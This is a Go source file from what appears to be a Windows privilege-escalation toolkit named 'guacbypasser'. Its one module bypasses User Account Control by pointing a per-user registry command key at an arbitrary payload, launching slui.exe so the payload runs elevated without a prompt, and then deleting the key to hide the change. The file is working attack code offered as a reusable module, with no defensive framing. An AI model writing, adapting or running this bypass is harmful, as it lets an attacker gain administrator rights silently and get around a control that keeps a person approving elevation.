package guacbypasser

import (
	"os/exec"
	"path/filepath"
	"time"

	sc ".."
	"golang.org/x/sys/windows/registry"
)

func w32_nt_once_slui(p string) (error, sc.Informer) {
	inf := sc.Informer{
		Name: "Slui",
		Desc: "Bypass UAC using slui and registry key manipulation",
		Id:   10,

		Type:   "Once",
		Module: "w32_nt_once_slui",

		Fixed:   true,
		FixedIn: "17134",

		Admin:   false,
		Payload: true,
	}

	fPath, err := filepath.Abs(p)
	if err != nil {
		return err, inf
	}
	if _, _, err = registry.CreateKey(
		registry.CURRENT_USER, `Software\Classes\exefile\shell\open\command`,
		registry.SET_VALUE|registry.ALL_ACCESS); err != nil {

		return err, inf
	}
	wk32, err := registry.OpenKey(
		registry.CURRENT_USER, `Software\Classes\exefile\shell\open\command`,
		registry.QUERY_VALUE|registry.SET_VALUE,
	)
	defer wk32.Close()
	if err != nil {
		return err, inf
	}

	if err := wk32.SetStringValue("", fPath); err != nil {
		return err, inf
	}
	if err := wk32.SetStringValue("DelegateExecute", ""); err != nil {
		return err, inf
	}
	time.Sleep(time.Second)

	cmd := exec.Command("slui.exe")
	if err := cmd.Run(); err != nil {
		return err, inf
	}
	time.Sleep(3 * time.Second)

	// Absolutly delete registry key "Software\Classes\exefile\shell\open\command" ...
	if err = registry.DeleteKey(registry.CURRENT_USER, `Software\Classes\exefile\shell\open\command`); err != nil {
		return err, inf
	}

	return nil, inf
}

// NewOnceSlui #add-some-info-please
func NewOnceSlui(p string) (error, sc.Informer) { return w32_nt_once_slui(p) }
